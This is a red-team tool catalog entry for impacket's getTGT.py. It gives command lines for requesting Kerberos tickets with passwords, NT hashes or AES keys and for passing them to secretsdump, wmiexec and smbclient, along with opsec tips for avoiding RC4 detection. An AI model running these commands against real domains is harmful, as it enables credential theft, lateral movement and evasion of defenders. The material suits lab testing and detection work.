---
name: impacket-getTGT
category: kerberos
subcategories: [tgt-request, kerberos-auth, linux-side]
tradecraft_tags: [impacket, tgt, kerberos, python, linux-side, pre-auth]
mitre_attack:
  - id: T1558
    name: Steal or Forge Kerberos Tickets
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: getTGT.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Standard Kerberos AS-REQ with pre-authentication. Identical to any legitimate
  Kerberos authentication — very low detection signal unless the account is unusual
  (RC4 etype from a non-Windows client, etc.).
usage_examples:
  - description: Request TGT with password
    args: "getTGT.py north.sevenkingdoms.local/jon.snow:Password123"
  - description: Request TGT with NT hash (overpass-the-hash from Linux)
    args: "getTGT.py -hashes :nthash north.sevenkingdoms.local/administrator"
  - description: Request TGT with AES key
    args: "getTGT.py -aesKey <aes256key> north.sevenkingdoms.local/administrator"
  - description: Use resulting TGT with other impacket tools
    args: "KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass DOMAIN/administrator@DC_IP"
opsec_notes: |
  Python-only — infrastructure side. The Linux-side equivalent of Rubeus asktgt.
  Produces a ccache file for use with KRB5CCNAME environment variable in subsequent
  impacket tool invocations. RC4 hash usage (--hashes) generates etype 23 AS-REQ
  which may be detected if RC4 auditing is enabled; prefer AES keys when available.
gotchas: |
  Python-only. AES keys are preferred over NT hashes (RC4) to avoid etype 23 detection.
  The ccache output file must be set with KRB5CCNAME before running subsequent tools.
  The TGT lifetime is 10 hours by default — renewal may be needed for long operations.
related_ttps: [rubeus, impacket-gettst, impacket-secretsdump, overpass-the-hash]
alternatives: [rubeus-asktgt]
common_args:
  target:
    description: DOMAIN/username format
    typical_values: ["north.sevenkingdoms.local/jon.snow:Password123"]
    required: true
  -hashes:
    description: NTLM hashes (LM:NT) for overpass-the-hash
    typical_values: [":nthash"]
  -aesKey:
    description: AES256 or AES128 key
    typical_values: ["<aes256key>"]
  -dc-ip:
    description: Domain controller IP
    typical_values: ["192.168.56.10"]
last_updated: 2026-05-29
---

# impacket-getTGT

impacket's Kerberos TGT request tool. Authenticates to the KDC and saves the resulting
TGT as a ccache file for use with other impacket tools. The Linux equivalent of
Rubeus asktgt.

## Usage Pattern

```bash
# 1. Get TGT:
getTGT.py -hashes :nthash DOMAIN/administrator -dc-ip DC_IP
# Output: administrator.ccache

# 2. Use TGT with any impacket tool:
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass DOMAIN/administrator@DC_IP
wmiexec.py -k -no-pass DOMAIN/administrator@TARGET_IP
smbclient.py -k -no-pass DOMAIN/administrator@TARGET_IP
```

## Etype Preference

```bash
# RC4 (detectable in environments with RC4 auditing):
getTGT.py -hashes :nthash DOMAIN/user

# AES256 (preferred — standard etype, less detectable):
getTGT.py -aesKey <aes256key> DOMAIN/user

# Password (most natural — standard AS-REQ):
getTGT.py DOMAIN/user:password
```
